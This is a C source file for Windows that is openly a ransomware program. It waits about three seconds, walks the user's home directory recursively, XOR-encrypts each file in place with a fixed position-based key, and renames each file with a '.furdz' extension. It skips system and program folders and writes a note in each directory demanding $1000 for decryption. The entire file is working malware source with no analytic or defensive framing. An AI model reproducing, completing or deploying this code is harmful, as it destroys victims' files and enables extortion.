#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#include "libc.h"
#include "entrypoint.h"

#define XOR_KEY(i) ((unsigned char)(0xE3 ^ ((i * 31) & 0xFF)))
#define MAX_PATH_LEN 1024
#define EXTENSION ".furdz"

static const char* ransom_text = "Your files have been encrypted. Pay $1000 to get the decryption key.";
static const char* ransom_filename = "README_RESTORE_FILES.txt";

static const char *skipped_path_keywords[] = {
    "\\AppData\\Local",
    "\\Program Files",
    "\\Windows",
    "\\System32",
    NULL
};

static bool should_skip_directory_path(const char *full_path) {
    for (int i = 0; skipped_path_keywords[i] != NULL; i++) {
        if (strstr(full_path, skipped_path_keywords[i]) != NULL)
            return true;
    }
    return false;
}

// Safe string copy (null-terminated)
static size_t str_copy(char *dst, const char *src, size_t max_len) {
    size_t i = 0;
    while (i + 1 < max_len && src[i]) {
        dst[i] = src[i];
        i++;
    }
    dst[i] = '\0';
    return i;
}

// Safe string append (null-terminated)
static size_t str_append(char *dst, const char *src, size_t max_len) {
    size_t i = 0;
    while (i < max_len && dst[i]) i++;  // find end of dst

    size_t j = 0;
    while (i + 1 < max_len && src[j]) {
        dst[i++] = src[j++];
    }
    if (i < max_len)
        dst[i] = '\0';

    return i;
}

// Builds: result = dir + "\\" + filename (if provided), or dir + "\\*"
static void concat_path(char *out, size_t max_len, const char *dir, const char *suffix) {
    out[0] = '\0';  // clear output
    str_copy(out, dir, max_len);
    str_append(out, "\\", max_len);
    if (suffix)
        str_append(out, suffix, max_len);
    else
        str_append(out, "*", max_len);
}

static void rename_to_enc(const char *filepath) {
    char newpath[MAX_PATH_LEN];

    // Copie le chemin d'origine
    str_copy(newpath, filepath, MAX_PATH_LEN);

    // Cherche la dernière position du point
    char *last_dot = strrchr(newpath, '.');
    if (last_dot) {
        *last_dot = '\0';  // coupe l'extension
    }

    str_append(newpath, EXTENSION, MAX_PATH_LEN);

    MoveFileA(filepath, newpath);  // rename
}

static bool xor_encrypt_file(const char *filepath) {
    FILE *file = fopen(filepath, "rb+");
    if (!file) return false;

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    rewind(file);

    if (filesize <= 0) {
        fclose(file);
        return false;
    }

    char *buffer = malloc(filesize);
    if (!buffer) {
        fclose(file);
        return false;
    }

    fread(buffer, 1, filesize, file);
    rewind(file);

    for (long i = 0; i < filesize; i++)
        buffer[i] ^= XOR_KEY(i);

    fwrite(buffer, 1, filesize, file);

    fclose(file);
    free(buffer);
    return true;
}

static void drop_ransom_note(const char *dirpath) {
    char note_path[MAX_PATH_LEN];
    concat_path(note_path, sizeof(note_path), dirpath, ransom_filename);

    FILE *note = fopen(note_path, "w");
    if (note) {
        fputs(ransom_text, note);
        fclose(note);
    }
}

static bool get_user_home_directory(char *buffer, DWORD size) {
    return GetEnvironmentVariableA("USERPROFILE", buffer, size) > 0;
}

static void walk_and_encrypt_directory(const char *dirpath) {
    char search_path[MAX_PATH_LEN];
    concat_path(search_path, sizeof(search_path), dirpath, NULL);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char full_path[MAX_PATH_LEN];
        concat_path(full_path, sizeof(full_path), dirpath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (should_skip_directory_path(full_path)) {
                continue;
            }
            walk_and_encrypt_directory(full_path);
            drop_ransom_note(full_path);
        } else {
            if (xor_encrypt_file(full_path)) {
                rename_to_enc(full_path);
            }
        }

    } while (FindNextFileA(hFind, &fd));


    FindClose(hFind);
}

void entrypoint() {
    Sleep(3200);
    char user_home[MAX_PATH_LEN];
    if (get_user_home_directory(user_home, sizeof(user_home))) {
        walk_and_encrypt_directory(user_home);  // C:\Users\<USERNAME>
    }
}